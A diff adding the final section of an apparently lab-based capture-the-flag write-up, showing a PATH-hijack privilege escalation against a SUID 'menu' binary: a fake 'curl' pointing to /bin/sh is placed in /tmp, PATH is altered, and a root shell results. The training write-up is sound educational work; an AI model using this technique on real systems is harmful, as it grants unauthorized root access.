@@ -670,3 +670,24 @@ As this file runs as the root users privileges, we can manipulate our path gain 
 
 let's the /bin/sh shell, called it curl, gave it the correct permissions and then put its location in our path. This means that when the /usr/bin/menu binary is run, its using our path variable to find the "curl" binary.. Which is actually a version of /usr/sh, as well as this file being run as root it will run our shell as root!
 
+```bash
+kenobi@kenobi:~$ echo /bin/sh > /tmp/curl
+kenobi@kenobi:~$ chmod 777 /tmp/curl
+kenobi@kenobi:~$ export PATH=/tmp:$PATH
+kenobi@kenobi:~$ menu
+
+***************************************
+1. status check
+2. kernel version
+3. ifconfig
+** Enter your choice :1
+# id
+uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare)
+# 
+```
+
+So we are root. Now we can simply grab the root flag by traversing to root directory.
+![root flag](.medias/kenobi/root_flag.png)
+
+We have successfully solved this room and answered all the questions. Hope you all enjoyed it. Stay tuned. `:-)`
+
